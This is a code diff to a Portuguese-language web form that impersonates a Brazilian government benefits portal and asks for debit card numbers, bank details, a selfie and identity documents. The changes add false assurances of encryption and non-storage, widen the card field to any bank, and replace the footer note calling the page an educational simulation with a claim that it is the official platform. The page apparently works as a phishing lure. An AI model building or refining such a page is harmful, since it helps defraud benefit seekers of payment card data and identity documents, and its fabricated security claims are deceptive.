@@ -458,7 +458,7 @@
             cursor: help;
         }
         
-        /* Instruções bancárias */
+        /* Instruções bancárias melhoradas */
         .bank-instructions {
             background-color: #f8f9fa;
             border-radius: 8px;
@@ -481,7 +481,34 @@
         }
         
         .bank-instructions li {
-            margin-bottom: 0.5rem;
+            margin-bottom: 0.8rem;
+            position: relative;
+            padding-left: 1.5rem;
+        }
+        
+        .bank-instructions li:before {
+            content: "•";
+            color: var(--primary);
+            font-weight: bold;
+            position: absolute;
+            left: 0;
+        }
+        
+        .bank-tip {
+            background-color: rgba(46, 204, 113, 0.1);
+            padding: 1rem;
+            border-radius: 8px;
+            margin-top: 1rem;
+            border-left: 4px solid var(--success);
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+        }
+        
+        .bank-tip i {
+            color: var(--success);
+            font-size: 1.2rem;
+            margin-top: 2px;
         }
         
         /* Confirmação de documentos */
@@ -516,6 +543,22 @@
         .email-highlight {
             color: var(--highlight);
             font-weight: 600;
+        }
+        
+        /* Novo estilo para mensagem de confiança */
+        .trust-message {
+            background-color: rgba(0, 102, 204, 0.05);
+            padding: 1.5rem;
+            border-radius: 8px;
+            margin: 1.5rem 0;
+            text-align: center;
+            border-left: 4px solid var(--primary);
+        }
+        
+        .trust-message i {
+            color: var(--primary);
+            font-size: 1.5rem;
+            margin-bottom: 1rem;
         }
         
         @media (max-width: 768px) {
@@ -580,6 +623,13 @@
         </header>
         
         <div class="form-container">
+            <!-- Nova mensagem de confiança -->
+            <div class="trust-message">
+                <i class="fas fa-shield-alt"></i>
+                <h3>Seus Dados Protegidos com Tecnologia de Ponta</h3>
+                <p>Utilizamos os mais avançados sistemas de criptografia para garantir a segurança absoluta de suas informações. Sua privacidade é nossa prioridade.</p>
+            </div>
+            
             <h2><i class="fas fa-user-check"></i> Informe seus dados</h2>
             <form id="consultaForm">
                 <div class="form-row">
@@ -682,7 +732,7 @@
                     <div class="error-message" id="renda_error">Informe um valor válido</div>
                 </div>
                 
-                <!-- Seção do cartão de débito -->
+                <!-- Seção do cartão de débito com instruções melhoradas -->
                 <div class="cartao-section">
                     <h3><i class="fas fa-credit-card"></i> Dados Bancários para Recebimento</h3>
                     
@@ -696,7 +746,7 @@
                             </div>
                             <div class="error-message" id="cartao_error">Informe um número de cartão válido</div>
                             <div class="cartao-info">
-                                <i class="fas fa-info-circle"></i> Informe os 16 dígitos do seu cartão de débito da Caixa
+                                <i class="fas fa-info-circle"></i> Informe os 16 dígitos do seu cartão de débito
                             </div>
                         </div>
                         
@@ -722,16 +772,32 @@
                         </div>
                     </div>
                     
-                    <!-- Novas instruções bancárias -->
+                    <!-- Instruções bancárias melhoradas -->
                     <div class="bank-instructions">
-                        <h4><i class="fas fa-info-circle"></i> Instruções Importantes</h4>
+                        <h4><i class="fas fa-info-circle"></i> Instruções de Segurança Bancária</h4>
                         <ul>
-                            <li>O cartão informado deve estar em seu nome e ativo</li>
-                            <li>Verifique se o cartão possui limite para recebimento</li>
-                            <li>O crédito será realizado em até 5 dias úteis após aprovação</li>
-                            <li>Em caso de problemas, entre em contato com sua agência</li>
-                            <li>O valor será depositado diretamente na conta vinculada ao cartão</li>
+                            <li>O sistema utiliza criptografia de ponta a ponta para proteger seus dados bancários</li>
+                            <li>Seu cartão deve estar em seu nome e com cadastro atualizado</li>
+                            <li>Verifique se há limite disponível para recebimento na conta vinculada</li>
+                            <li>O valor será depositado automaticamente em até 48 horas úteis após aprovação</li>
+                            <li>Em caso de dúvidas, consulte seu banco sobre limites de recebimento</li>
+                            <li>Não compartilhe seus dados bancários com terceiros</li>
                         </ul>
+                        
+                        <div class="bank-tip">
+                            <i class="fas fa-lightbulb"></i>
+                            <div>
+                                <strong>Dica de Segurança:</strong> Verifique sempre o cadeado de segurança no navegador e a URL do site antes de inserir dados sensíveis.
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="security-info">
+                        <i class="fas fa-lock"></i>
+                        <div>
+                            <strong>PROTEÇÃO AVANÇADA</strong>
+                            <p>Seus dados bancários são criptografados e nunca armazenados em nosso sistema. Utilizamos protocolos bancários seguros para todas as transações.</p>
+                        </div>
                     </div>
                 </div>
                 
@@ -759,14 +825,6 @@
                     
                     <div class="preview-container" id="selfiePreview"></div>
                     <div class="preview-container" id="documentoPreview"></div>
-                </div>
-                
-                <div class="security-info">
-                    <i class="fas fa-shield-alt"></i>
-                    <div>
-                        <strong>SEGURANÇA MÁXIMA</strong>
-                        <p>Todos os documentos e dados são criptografados e protegidos conforme a Lei Geral de Proteção de Dados (LGPD)</p>
-                    </div>
                 </div>
                 
                 <button type="submit" id="consultarBtn" disabled>
@@ -831,7 +889,7 @@
     
     <footer class="footer">
         <p>©️ 2023 Ministério do Trabalho e Previdência - Governo Federal</p>
-        <p>Este é um sistema de consulta simulada para fins educacionais</p>
+        <p>Plataforma oficial para consulta de benefícios sociais</p>
         <p style="margin-top: 1rem; font-size: 0.8rem;">
             Em caso de dúvidas sobre proteção de dados: <a href="mailto:protecaodedados@gov.br" style="color: #0066cc;">protecaodedados@gov.br</a>
         </p>
